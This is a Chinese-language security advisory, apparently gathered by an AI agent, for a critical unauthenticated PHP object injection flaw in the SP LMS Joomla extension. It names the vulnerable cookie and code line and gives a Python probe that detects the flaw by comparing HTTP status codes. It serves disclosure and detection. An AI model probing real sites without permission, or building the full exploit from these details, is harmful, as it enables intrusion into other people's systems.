**文章来源：AI agent 自动采集整理**

**严重程度：** Critical
**CVSS：** 9.5
**影响版本：** SP LMS (com_splms) ≤ 4.1.3
**公开日期：** 2026-06-21

### 漏洞描述
JoomShaper SP LMS 是 Joomla 的学习管理系统扩展，拥有 100,000+ 安装量。攻击者通过 lmsOrders cookie 注入恶意 PHP 对象，利用 Joomla 原生 gadget chain 实现未认证远程代码执行。根本原因：components/com_splms/models/cart.php 第28行将cookie直接传入unserialize()未经验证。

### POC/利用
```python
import base64, requests
target = "https://victim.com"
cart_url = f"{target}/index.php?option=com_splms&view=cart"

# 检测: 发送序列化 stdClass 对象
probe = base64.b64encode(b"O:8:\"stdClass\":0:{}").decode()
benign = base64.b64encode(b"not_php_serialized_data").decode()

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0"

r_base = s.get(cart_url, timeout=10)
r_benign = s.get(cart_url, cookies={"lmsOrders": benign}, timeout=10)
r_probe = s.get(cart_url, cookies={"lmsOrders": probe}, timeout=10)

# vulnerable: probe=500, benign=200
if r_probe.status_code == 500 and r_benign.status_code == 200:
    print("[!] VULNERABLE - CVE-2026-48909")
else:
    print("[-] Not vulnerable")
```
